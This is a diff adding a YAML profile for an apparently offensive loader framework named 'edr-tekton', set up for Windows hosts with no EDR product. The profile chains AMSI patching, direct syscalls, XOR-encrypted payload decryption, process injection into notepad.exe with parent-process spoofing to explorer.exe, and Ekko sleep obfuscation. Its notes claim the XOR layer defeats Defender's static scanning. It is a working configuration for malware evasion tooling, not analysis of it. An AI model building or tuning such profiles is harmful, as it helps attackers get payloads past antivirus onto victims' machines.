@@ -1,0 +1,98 @@
+# edr-tekton :: No EDR Profile
+#
+# For environments where no EDR is detected. Uses the simplest,
+# fastest, most reliable techniques with minimal evasion overhead.
+# Still encrypts payload and uses basic syscall routing for
+# defense-in-depth against Windows Defender baseline.
+
+profile:
+  name: no_edr
+  display_name: "No EDR Detected"
+  version: "1.0"
+  vendor: none
+
+threat_levels:
+  user_hooks: none
+  kernel_cb: low           # OS still has kernel callbacks
+  etw: low                 # OS ETW still runs
+  minifilter: none
+  wfp: none
+  scanner: medium          # Windows Defender baseline
+  elam: low                # Defender ELAM
+  nirvana: none
+  hypervisor: none
+
+stages:
+  fingerprint:
+    primary: auto
+    required: true
+
+  api_resolve:
+    primary: dynamic_resolve
+    fallbacks:
+      - peb_walk
+    required: true
+    max_risk: 50
+
+  evasion_pre:
+    primary: amsi_patch
+    required: false
+    max_risk: 40
+    notes: "Still patch AMSI for Defender baseline"
+
+  syscall_init:
+    primary: direct_syscall
+    fallbacks:
+      - indirect_syscall
+    required: false
+    max_risk: 30
+    additional:
+      - ssn_resolve
+
+  decrypt:
+    primary: encrypt_xor
+    fallbacks:
+      - encrypt_rc4
+    required: true
+    max_risk: 50
+
+  inject:
+    primary: inject_classic
+    fallbacks:
+      - inject_apc
+      - inject_callback
+    required: true
+    max_risk: 50
+
+  sleep_init:
+    primary: sleep_ekko
+    required: false
+    max_risk: 30
+
+  cleanup:
+    primary: auto
+    required: false
+
+constraints:
+  max_total_risk: 300
+  prefer_stealthy: false
+  require_x64: false
+  min_os_build: 10240      # Win10 RTM
+
+sleep:
+  interval_ms: 3000
+  encrypt: false
+
+encryption:
+  layers:
+    - type: xor
+      key_source: static
+
+inject_target: "notepad.exe"
+ppid_parent: "explorer.exe"
+
+notes: >
+  No EDR detected. Uses simplest, fastest techniques for
+  maximum reliability. XOR encryption defeats Defender
+  baseline static scanning. Classic injection is reliable.
+  Direct syscalls for clean API calls without hook overhead.
